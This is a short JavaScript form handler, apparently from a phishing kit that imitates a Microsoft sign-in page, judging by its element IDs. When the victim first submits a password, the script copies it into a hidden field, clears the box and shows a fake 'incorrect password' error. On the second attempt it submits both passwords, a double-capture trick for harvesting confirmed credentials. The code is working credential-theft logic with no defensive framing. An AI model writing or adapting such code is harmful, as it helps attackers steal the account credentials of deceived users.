const PASS_INPUT = document.getElementById('i0118');
const PASS1_ERROR = document.getElementById('passwordError1');
const PASS2_ERROR = document.getElementById('passwordError2');
const form = document.getElementById('i0281');
var allow_password_2 = 0;

function checkData(){
    event.preventDefault();
    if(PASS_INPUT.value.length == 0){
        PASS1_ERROR.style.display = 'block';
        PASS_INPUT.classList.add('has-error');
    }
    if(PASS_INPUT.value.length < 6 && PASS_INPUT.value.length != 0){
        PASS1_ERROR.style.display = 'none';
        PASS2_ERROR.style.display = 'block';
        PASS_INPUT.classList.add('has-error');
    }
    else if(PASS_INPUT.value.length > 6 && allow_password_2 == 0){
        document.querySelector('#FIRST_PWD').value = PASS_INPUT.value;
        PASS1_ERROR.style.display = 'none';
        PASS2_ERROR.style.display = 'block';
        PASS_INPUT.classList.add('has-error');
        PASS_INPUT.value = null;
        allow_password_2++;
    }
    else if(PASS_INPUT.value.length > 6 && allow_password_2 == 1){
        PASS1_ERROR.style.display = 'none';
        PASS2_ERROR.style.display = 'none';
        PASS_INPUT.classList.remove('has-error');
        form.submit();
    }
}